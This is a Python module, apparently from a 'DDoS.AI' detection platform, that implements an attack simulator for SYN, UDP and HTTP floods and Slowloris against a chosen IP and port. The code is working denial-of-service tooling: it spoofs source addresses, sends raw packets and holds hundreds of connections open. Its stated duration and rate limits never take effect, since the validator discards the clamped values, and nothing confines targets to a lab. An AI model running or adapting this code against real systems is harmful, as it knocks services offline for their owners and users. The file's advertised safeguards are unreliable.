"""
Attack Simulator for DDoS.AI platform

This module provides simulation capabilities for various DDoS attack types
to test detection algorithms and train AI models.
"""
import logging
import time
import threading
import random
import socket
import ipaddress
from typing import Dict, List, Any, Optional, Union, Tuple
from datetime import datetime, timedelta
import uuid
import os
import sys
import signal
from enum import Enum

# Check if scapy is available
try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.layers.http import HTTP, HTTPRequest
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from models.data_models import AttackType, ProtocolType
from core.exceptions import SimulationError


class SimulationStatus(Enum):
    """Simulation status enum"""
    IDLE = "idle"
    RUNNING = "running"
    PAUSED = "paused"
    COMPLETED = "completed"
    ERROR = "error"


class AttackSimulator:
    """
    Attack Simulator for generating various types of DDoS attacks
    
    This class provides methods to simulate different DDoS attack types
    with configurable parameters for testing detection algorithms.
    """
    
    def __init__(self):
        """Initialize attack simulator"""
        self.logger = logging.getLogger(__name__)
        
        if not SCAPY_AVAILABLE:
            self.logger.warning("Scapy not available. Some attack simulations will be limited.")
        
        # Simulation state
        self.status = SimulationStatus.IDLE
        self.current_simulation = None
        self.simulation_thread = None
        self.stop_event = threading.Event()
        
        # Simulation statistics
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "start_time": None,
            "end_time": None,
            "attack_type": None,
            "target_ip": None,
            "duration": 0,
            "packet_rate": 0,
            "errors": 0
        }
        
        # Safety limits
        self.max_packet_rate = 10000  # packets per second
        self.max_duration = 300  # seconds
        self.max_packet_size = 1500  # bytes
        
        self.logger.info("Attack simulator initialized")
    
    def simulate_syn_flood(self, target_ip: str, target_port: int = 80, 
                          duration: int = 60, packet_rate: int = 1000,
                          source_ip_range: Optional[List[str]] = None) -> str:
        """
        Simulate SYN flood attack
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            duration: Attack duration in seconds
            packet_rate: Packets per second
            source_ip_range: List of source IP addresses to use (random if None)
            
        Returns:
            Simulation ID
        
        Raises:
            SimulationError: If simulation parameters are invalid or simulation fails
        """
        # Validate parameters
        self._validate_simulation_params(target_ip, duration, packet_rate)
        
        # Generate simulation ID
        simulation_id = f"syn_flood_{uuid.uuid4().hex[:8]}"
        
        # Prepare simulation configuration
        config = {
            "simulation_id": simulation_id,
            "attack_type": AttackType.SYN_FLOOD,
            "target_ip": target_ip,
            "target_port": target_port,
            "duration": duration,
            "packet_rate": packet_rate,
            "source_ip_range": source_ip_range or self._generate_random_ip_range(100),
            "protocol": ProtocolType.TCP
        }
        
        # Start simulation in a separate thread
        self._start_simulation(config, self._run_syn_flood)
        
        return simulation_id    
    def simulate_udp_flood(self, target_ip: str, target_port: int = 53,
                          duration: int = 60, packet_rate: int = 1000,
                          packet_size: int = 512,
                          source_ip_range: Optional[List[str]] = None) -> str:
        """
        Simulate UDP flood attack
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            duration: Attack duration in seconds
            packet_rate: Packets per second
            packet_size: Size of each packet in bytes
            source_ip_range: List of source IP addresses to use (random if None)
            
        Returns:
            Simulation ID
        
        Raises:
            SimulationError: If simulation parameters are invalid or simulation fails
        """
        # Validate parameters
        self._validate_simulation_params(target_ip, duration, packet_rate)
        
        if packet_size > self.max_packet_size:
            self.logger.warning(f"Packet size {packet_size} exceeds maximum {self.max_packet_size}. Using maximum.")
            packet_size = self.max_packet_size
        
        # Generate simulation ID
        simulation_id = f"udp_flood_{uuid.uuid4().hex[:8]}"
        
        # Prepare simulation configuration
        config = {
            "simulation_id": simulation_id,
            "attack_type": AttackType.UDP_FLOOD,
            "target_ip": target_ip,
            "target_port": target_port,
            "duration": duration,
            "packet_rate": packet_rate,
            "packet_size": packet_size,
            "source_ip_range": source_ip_range or self._generate_random_ip_range(100),
            "protocol": ProtocolType.UDP
        }
        
        # Start simulation in a separate thread
        self._start_simulation(config, self._run_udp_flood)
        
        return simulation_id
    
    def simulate_http_flood(self, target_ip: str, target_port: int = 80,
                           duration: int = 60, request_rate: int = 100,
                           num_threads: int = 10, use_https: bool = False,
                           urls: Optional[List[str]] = None) -> str:
        """
        Simulate HTTP flood attack
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            duration: Attack duration in seconds
            request_rate: Requests per second
            num_threads: Number of threads to use
            use_https: Whether to use HTTPS
            urls: List of URLs to request (random if None)
            
        Returns:
            Simulation ID
        
        Raises:
            SimulationError: If simulation parameters are invalid or simulation fails
        """
        # Validate parameters
        self._validate_simulation_params(target_ip, duration, request_rate)
        
        if num_threads > 100:
            self.logger.warning(f"Thread count {num_threads} exceeds maximum 100. Using maximum.")
            num_threads = 100
        
        # Generate simulation ID
        simulation_id = f"http_flood_{uuid.uuid4().hex[:8]}"
        
        # Prepare simulation configuration
        config = {
            "simulation_id": simulation_id,
            "attack_type": AttackType.HTTP_FLOOD,
            "target_ip": target_ip,
            "target_port": target_port,
            "duration": duration,
            "request_rate": request_rate,
            "num_threads": num_threads,
            "use_https": use_https,
            "urls": urls or self._generate_random_urls(20),
            "protocol": ProtocolType.HTTPS if use_https else ProtocolType.HTTP
        }
        
        # Start simulation in a separate thread
        self._start_simulation(config, self._run_http_flood)
        
        return simulation_id    
   
    def simulate_slowloris(self, target_ip: str, target_port: int = 80,
                          duration: int = 60, num_connections: int = 500,
                          connection_rate: int = 50, use_https: bool = False) -> str:
        """
        Simulate Slowloris attack
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            duration: Attack duration in seconds
            num_connections: Maximum number of connections to establish
            connection_rate: New connections per second
            use_https: Whether to use HTTPS
            
        Returns:
            Simulation ID
        
        Raises:
            SimulationError: If simulation parameters are invalid or simulation fails
        """
        # Validate parameters
        self._validate_simulation_params(target_ip, duration, connection_rate)
        
        if num_connections > 1000:
            self.logger.warning(f"Connection count {num_connections} exceeds maximum 1000. Using maximum.")
            num_connections = 1000
        
        # Generate simulation ID
        simulation_id = f"slowloris_{uuid.uuid4().hex[:8]}"
        
        # Prepare simulation configuration
        config = {
            "simulation_id": simulation_id,
            "attack_type": AttackType.SLOWLORIS,
            "target_ip": target_ip,
            "target_port": target_port,
            "duration": duration,
            "num_connections": num_connections,
            "connection_rate": connection_rate,
            "use_https": use_https,
            "protocol": ProtocolType.HTTPS if use_https else ProtocolType.HTTP
        }
        
        # Start simulation in a separate thread
        self._start_simulation(config, self._run_slowloris)
        
        return simulation_id
    
    def stop_simulation(self, simulation_id: Optional[str] = None) -> Dict[str, Any]:
        """
        Stop running simulation
        
        Args:
            simulation_id: ID of simulation to stop (current if None)
            
        Returns:
            Simulation statistics
            
        Raises:
            SimulationError: If no simulation is running or simulation ID doesn't match
        """
        if self.status != SimulationStatus.RUNNING:
            raise SimulationError("No simulation is currently running")
        
        if simulation_id and self.current_simulation["simulation_id"] != simulation_id:
            raise SimulationError(f"Simulation ID mismatch: {simulation_id} vs {self.current_simulation['simulation_id']}")
        
        # Signal thread to stop
        self.stop_event.set()
        
        # Wait for thread to finish
        if self.simulation_thread and self.simulation_thread.is_alive():
            self.simulation_thread.join(timeout=5)
            
            # Force terminate if still running
            if self.simulation_thread.is_alive():
                self.logger.warning("Simulation thread did not terminate gracefully")
        
        # Update status and statistics
        self.status = SimulationStatus.COMPLETED
        self.stats["end_time"] = datetime.now()
        
        if self.stats["start_time"]:
            elapsed = (self.stats["end_time"] - self.stats["start_time"]).total_seconds()
            self.stats["duration"] = elapsed
            
            if elapsed > 0:
                self.stats["packet_rate"] = self.stats["packets_sent"] / elapsed
        
        return self.get_statistics() 
   
    def get_statistics(self) -> Dict[str, Any]:
        """
        Get simulation statistics
        
        Returns:
            Dictionary with simulation statistics
        """
        stats = self.stats.copy()
        
        # Add current status
        stats["status"] = self.status.value
        
        # Add current simulation details if running
        if self.current_simulation:
            stats["simulation_id"] = self.current_simulation["simulation_id"]
            stats["attack_type"] = self.current_simulation["attack_type"].value
            stats["target_ip"] = self.current_simulation["target_ip"]
            stats["target_port"] = self.current_simulation.get("target_port")
        
        # Calculate elapsed time if running
        if self.status == SimulationStatus.RUNNING and self.stats["start_time"]:
            elapsed = (datetime.now() - self.stats["start_time"]).total_seconds()
            stats["elapsed_time"] = elapsed
            
            if elapsed > 0:
                stats["current_packet_rate"] = self.stats["packets_sent"] / elapsed
        
        return stats
    
    def _start_simulation(self, config: Dict[str, Any], simulation_func):
        """Start simulation in a separate thread"""
        if self.status == SimulationStatus.RUNNING:
            raise SimulationError("A simulation is already running")
        
        # Reset state
        self.stop_event.clear()
        self.current_simulation = config
        
        # Reset statistics
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "start_time": datetime.now(),
            "end_time": None,
            "attack_type": config["attack_type"].value,
            "target_ip": config["target_ip"],
            "duration": 0,
            "packet_rate": 0,
            "errors": 0
        }
        
        # Start simulation thread
        self.simulation_thread = threading.Thread(
            target=simulation_func,
            args=(config,),
            daemon=True
        )
        self.simulation_thread.start()
        
        self.status = SimulationStatus.RUNNING
        self.logger.info(f"Started {config['attack_type'].value} simulation: {config['simulation_id']}")
    
    def _run_syn_flood(self, config: Dict[str, Any]):
        """Run SYN flood simulation"""
        if not SCAPY_AVAILABLE:
            self._run_syn_flood_socket(config)
            return
        
        try:
            target_ip = config["target_ip"]
            target_port = config["target_port"]
            duration = config["duration"]
            packet_rate = config["packet_rate"]
            source_ips = config["source_ip_range"]
            
            # Calculate delay between packets
            delay = 1.0 / packet_rate if packet_rate > 0 else 0
            
            # Set end time
            end_time = datetime.now() + timedelta(seconds=duration)
            
            # Create SYN packets
            while datetime.now() < end_time and not self.stop_event.is_set():
                try:
                    # Select random source IP
                    src_ip = random.choice(source_ips)
                    src_port = random.randint(1024, 65535)
                    
                    # Create SYN packet
                    packet = (
                        IP(src=src_ip, dst=target_ip) /
                        TCP(sport=src_port, dport=target_port, flags="S")
                    )
                    
                    # Send packet
                    scapy.send(packet, verbose=0)
                    
                    # Update statistics
                    self.stats["packets_sent"] += 1
                    self.stats["bytes_sent"] += len(packet)
                    
                    # Sleep to maintain packet rate
                    time.sleep(delay)
                    
                except Exception as e:
                    self.logger.error(f"Error sending SYN packet: {e}")
                    self.stats["errors"] += 1
                    time.sleep(0.1)  # Avoid tight loop on errors
            
        except Exception as e:
            self.logger.error(f"SYN flood simulation error: {e}")
            self.status = SimulationStatus.ERROR  
  
    def _run_syn_flood_socket(self, config: Dict[str, Any]):
        """Run SYN flood simulation using raw sockets (fallback)"""
        try:
            target_ip = config["target_ip"]
            target_port = config["target_port"]
            duration = config["duration"]
            packet_rate = config["packet_rate"]
            source_ips = config["source_ip_range"]
            
            # Calculate delay between packets
            delay = 1.0 / packet_rate if packet_rate > 0 else 0
            
            # Set end time
            end_time = datetime.now() + timedelta(seconds=duration)
            
            # Create socket
            try:
                # Create raw socket
                if os.name == "nt":  # Windows
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                else:  # Linux/Unix
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
            except socket.error as e:
                self.logger.error(f"Socket creation error: {e}")
                self.logger.warning("Raw socket creation failed. Using TCP socket for simulation.")
                
                # Fallback to regular TCP socket
                while datetime.now() < end_time and not self.stop_event.is_set():
                    try:
                        # Create TCP socket
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        
                        # Connect to target (will be incomplete due to SYN only)
                        sock.connect_ex((target_ip, target_port))
                        
                        # Update statistics
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += 64  # Approximate SYN packet size
                        
                        # Sleep to maintain packet rate
                        time.sleep(delay)
                        
                    except Exception:
                        # Ignore connection errors - expected for SYN flood
                        pass
                    
                    finally:
                        # Close socket
                        try:
                            sock.close()
                        except:
                            pass
                
                return
            
            # Send SYN packets using raw socket
            while datetime.now() < end_time and not self.stop_event.is_set():
                try:
                    # Select random source IP
                    src_ip = random.choice(source_ips)
                    src_port = random.randint(1024, 65535)
                    
                    # Create packet (simplified)
                    packet = self._create_syn_packet(src_ip, target_ip, src_port, target_port)
                    
                    # Send packet
                    sock.sendto(packet, (target_ip, 0))
                    
                    # Update statistics
                    self.stats["packets_sent"] += 1
                    self.stats["bytes_sent"] += len(packet)
                    
                    # Sleep to maintain packet rate
                    time.sleep(delay)
                    
                except Exception as e:
                    self.logger.error(f"Error sending SYN packet: {e}")
                    self.stats["errors"] += 1
                    time.sleep(0.1)  # Avoid tight loop on errors
            
            # Close socket
            sock.close()
            
        except Exception as e:
            self.logger.error(f"SYN flood socket simulation error: {e}")
            self.status = SimulationStatus.ERROR
    
    def _run_udp_flood(self, config: Dict[str, Any]):
        """Run UDP flood simulation"""
        if not SCAPY_AVAILABLE:
            self._run_udp_flood_socket(config)
            return
        
        try:
            target_ip = config["target_ip"]
            target_port = config["target_port"]
            duration = config["duration"]
            packet_rate = config["packet_rate"]
            packet_size = config["packet_size"]
            source_ips = config["source_ip_range"]
            
            # Calculate delay between packets
            delay = 1.0 / packet_rate if packet_rate > 0 else 0
            
            # Set end time
            end_time = datetime.now() + timedelta(seconds=duration)
            
            # Create payload
            payload = b"X" * (packet_size - 28)  # Subtract IP and UDP header sizes
            
            # Send UDP packets
            while datetime.now() < end_time and not self.stop_event.is_set():
                try:
                    # Select random source IP
                    src_ip = random.choice(source_ips)
                    src_port = random.randint(1024, 65535)
                    
                    # Create UDP packet
                    packet = (
                        IP(src=src_ip, dst=target_ip) /
                        UDP(sport=src_port, dport=target_port) /
                        payload
                    )
                    
                    # Send packet
                    scapy.send(packet, verbose=0)
                    
                    # Update statistics
                    self.stats["packets_sent"] += 1
                    self.stats["bytes_sent"] += len(packet)
                    
                    # Sleep to maintain packet rate
                    time.sleep(delay)
                    
                except Exception as e:
                    self.logger.error(f"Error sending UDP packet: {e}")
                    self.stats["errors"] += 1
                    time.sleep(0.1)  # Avoid tight loop on errors
            
        except Exception as e:
            self.logger.error(f"UDP flood simulation error: {e}")
            self.status = SimulationStatus.ERROR 
   
    def _run_udp_flood_socket(self, config: Dict[str, Any]):
        """Run UDP flood simulation using sockets (fallback)"""
        try:
            target_ip = config["target_ip"]
            target_port = config["target_port"]
            duration = config["duration"]
            packet_rate = config["packet_rate"]
            packet_size = config["packet_size"]
            source_ips = config["source_ip_range"]
            
            # Calculate delay between packets
            delay = 1.0 / packet_rate if packet_rate > 0 else 0
            
            # Set end time
            end_time = datetime.now() + timedelta(seconds=duration)
            
            # Create payload
            payload = b"X" * packet_size
            
            # Send UDP packets
            while datetime.now() < end_time and not self.stop_event.is_set():
                try:
                    # Create UDP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Send packet
                    sock.sendto(payload, (target_ip, target_port))
                    
                    # Update statistics
                    self.stats["packets_sent"] += 1
                    self.stats["bytes_sent"] += packet_size
                    
                    # Close socket
                    sock.close()
                    
                    # Sleep to maintain packet rate
                    time.sleep(delay)
                    
                except Exception as e:
                    self.logger.error(f"Error sending UDP packet: {e}")
                    self.stats["errors"] += 1
                    time.sleep(0.1)  # Avoid tight loop on errors
            
        except Exception as e:
            self.logger.error(f"UDP flood socket simulation error: {e}")
            self.status = SimulationStatus.ERROR
    
    def _run_http_flood(self, config: Dict[str, Any]):
        """Run HTTP flood simulation"""
        try:
            target_ip = config["target_ip"]
            target_port = config["target_port"]
            duration = config["duration"]
            request_rate = config["request_rate"]
            num_threads = config["num_threads"]
            use_https = config["use_https"]
            urls = config["urls"]
            
            # Calculate requests per thread
            requests_per_thread = request_rate // num_threads
            if requests_per_thread < 1:
                requests_per_thread = 1
            
            # Set end time
            end_time = datetime.now() + timedelta(seconds=duration)
            
            # Create thread pool
            threads = []
            thread_stop_events = []
            
            for i in range(num_threads):
                stop_event = threading.Event()
                thread_stop_events.append(stop_event)
                
                thread = threading.Thread(
                    target=self._http_flood_worker,
                    args=(target_ip, target_port, use_https, urls, requests_per_thread, end_time, stop_event),
                    daemon=True
                )
                threads.append(thread)
                thread.start()
            
            # Wait for duration or stop event
            while datetime.now() < end_time and not self.stop_event.is_set():
                time.sleep(0.1)
            
            # Signal all threads to stop
            for stop_event in thread_stop_events:
                stop_event.set()
            
            # Wait for all threads to finish
            for thread in threads:
                thread.join(timeout=2)
            
        except Exception as e:
            self.logger.error(f"HTTP flood simulation error: {e}")
            self.status = SimulationStatus.ERROR  
  
    def _http_flood_worker(self, target_ip: str, target_port: int, use_https: bool,
                          urls: List[str], requests_per_second: int, end_time: datetime,
                          stop_event: threading.Event):
        """Worker thread for HTTP flood"""
        try:
            # Calculate delay between requests
            delay = 1.0 / requests_per_second if requests_per_second > 0 else 0
            
            # Protocol
            protocol = "https" if use_https else "http"
            
            # Import requests library
            try:
                import requests
                from requests.exceptions import RequestException
                requests_available = True
            except ImportError:
                requests_available = False
            
            # Send HTTP requests
            while datetime.now() < end_time and not stop_event.is_set():
                try:
                    # Select random URL
                    url_path = random.choice(urls)
                    url = f"{protocol}://{target_ip}:{target_port}{url_path}"
                    
                    if requests_available:
                        # Use requests library
                        try:
                            response = requests.get(
                                url,
                                timeout=1,
                                verify=False,  # Ignore SSL verification
                                headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                    "Accept": "text/html,application/xhtml+xml,application/xml",
                                    "Connection": "keep-alive"
                                }
                            )
                            
                            # Update statistics
                            with threading.Lock():
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(response.content) if response.content else 0
                            
                        except RequestException:
                            # Ignore connection errors - expected for flood
                            with threading.Lock():
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += 200  # Approximate request size
                    
                    else:
                        # Fallback to socket
                        sock = None
                        try:
                            # Create socket
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            
                            # Connect to target
                            sock.connect((target_ip, target_port))
                            
                            # Create HTTP request
                            request = f"GET {url_path} HTTP/1.1\r\n"
                            request += f"Host: {target_ip}:{target_port}\r\n"
                            request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml\r\n"
                            request += "Connection: keep-alive\r\n\r\n"
                            
                            # Send request
                            sock.send(request.encode())
                            
                            # Update statistics
                            with threading.Lock():
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                        except Exception:
                            # Ignore connection errors - expected for flood
                            with threading.Lock():
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += 200  # Approximate request size
                        
                        finally:
                            # Close socket
                            if sock:
                                try:
                                    sock.close()
                                except:
                                    pass
                    
                    # Sleep to maintain request rate
                    time.sleep(delay)
                    
                except Exception as e:
                    self.logger.error(f"Error sending HTTP request: {e}")
                    with threading.Lock():
                        self.stats["errors"] += 1
                    time.sleep(0.1)  # Avoid tight loop on errors
            
        except Exception as e:
            self.logger.error(f"HTTP flood worker error: {e}")
    
    def _run_slowloris(self, config: Dict[str, Any]):
        """Run Slowloris attack simulation"""
        try:
            target_ip = config["target_ip"]
            target_port = config["target_port"]
            duration = config["duration"]
            num_connections = config["num_connections"]
            connection_rate = config["connection_rate"]
            use_https = config["use_https"]
            
            # Calculate delay between connections
            delay = 1.0 / connection_rate if connection_rate > 0 else 0
            
            # Set end time
            end_time = datetime.now() + timedelta(seconds=duration)
            
            # Create socket pool
            sockets = []
            
            # Create and maintain connections
            while datetime.now() < end_time and not self.stop_event.is_set():
                # Create new connections up to the limit
                while len(sockets) < num_connections and datetime.now() < end_time and not self.stop_event.is_set():
                    try:
                        # Create socket
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        
                        # Connect to target
                        sock.connect((target_ip, target_port))
                        
                        # Send partial HTTP request
                        request = f"GET / HTTP/1.1\r\n"
                        request += f"Host: {target_ip}:{target_port}\r\n"
                        request += "User-Agent: Mozilla/5.0\r\n"
                        
                        # Send incomplete request
                        sock.send(request.encode())
                        
                        # Add to socket pool
                        sockets.append(sock)
                        
                        # Update statistics
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                        
                        # Sleep to maintain connection rate
                        time.sleep(delay)
                        
                    except Exception as e:
                        self.logger.error(f"Error creating Slowloris connection: {e}")
                        self.stats["errors"] += 1
                        time.sleep(0.1)  # Avoid tight loop on errors            
    
                # Send keep-alive headers to all sockets
                for i in range(len(sockets) - 1, -1, -1):
                    try:
                        # Send random header to keep connection alive
                        header = f"X-a: {random.randint(1, 5000)}\r\n"
                        sockets[i].send(header.encode())
                        
                        # Update statistics
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(header)
                        
                    except Exception:
                        # Remove dead socket
                        try:
                            sockets[i].close()
                        except:
                            pass
                        sockets.pop(i)
                
                # Sleep before next round
                time.sleep(10)
            
            # Close all sockets
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
        except Exception as e:
            self.logger.error(f"Slowloris simulation error: {e}")
            self.status = SimulationStatus.ERROR
    
    def _validate_simulation_params(self, target_ip: str, duration: int, packet_rate: int):
        """Validate simulation parameters"""
        # Validate target IP
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise SimulationError(f"Invalid target IP address: {target_ip}")
        
        # Validate duration
        if duration <= 0:
            raise SimulationError(f"Invalid duration: {duration}")
        
        if duration > self.max_duration:
            self.logger.warning(f"Duration {duration}s exceeds maximum {self.max_duration}s. Using maximum.")
            duration = self.max_duration
        
        # Validate packet rate
        if packet_rate <= 0:
            raise SimulationError(f"Invalid packet rate: {packet_rate}")
        
        if packet_rate > self.max_packet_rate:
            self.logger.warning(f"Packet rate {packet_rate} exceeds maximum {self.max_packet_rate}. Using maximum.")
            packet_rate = self.max_packet_rate
    
    def _generate_random_ip_range(self, count: int) -> List[str]:
        """Generate random IP addresses"""
        ip_range = []
        
        for _ in range(count):
            # Generate random private IP
            first_octet = random.choice([10, 172, 192])
            
            if first_octet == 10:
                # 10.0.0.0/8
                ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            elif first_octet == 172:
                # 172.16.0.0/12
                ip = f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            else:
                # 192.168.0.0/16
                ip = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
            
            ip_range.append(ip)
        
        return ip_range
    
    def _generate_random_urls(self, count: int) -> List[str]:
        """Generate random URLs"""
        paths = [
            "/",
            "/index.html",
            "/about",
            "/contact",
            "/products",
            "/services",
            "/login",
            "/register",
            "/api/v1/users",
            "/api/v1/products",
            "/images/logo.png",
            "/css/style.css",
            "/js/main.js",
            "/blog",
            "/blog/post1",
            "/search?q=test",
            "/profile?id=123",
            "/download?file=data.zip",
            "/admin",
            "/settings"
        ]
        
        # Select random paths or use all if count > len(paths)
        if count >= len(paths):
            return paths
        else:
            return random.sample(paths, count)
    
    def _create_syn_packet(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int) -> bytes:
        """Create a raw SYN packet (simplified)"""
        # This is a very simplified implementation and won't work in most cases
        # A proper implementation would require building the entire IP and TCP headers
        
        # Placeholder for a raw packet
        packet = b"\x45\x00\x00\x28"  # IP header
        packet += b"\x00\x00\x40\x00"
        packet += b"\x40\x06\x00\x00"
        
        # Source IP
        src_ip_bytes = bytes([int(x) for x in src_ip.split(".")])
        packet += src_ip_bytes
        
        # Destination IP
        dst_ip_bytes = bytes([int(x) for x in dst_ip.split(".")])
        packet += dst_ip_bytes
        
        # TCP header
        packet += src_port.to_bytes(2, byteorder="big")
        packet += dst_port.to_bytes(2, byteorder="big")
        packet += b"\x00\x00\x00\x00"  # Sequence number
        packet += b"\x00\x00\x00\x00"  # Acknowledgment number
        packet += b"\x50\x02\x20\x00"  # Header length, flags (SYN), window size
        packet += b"\x00\x00\x00\x00"  # Checksum, urgent pointer
        
        return packet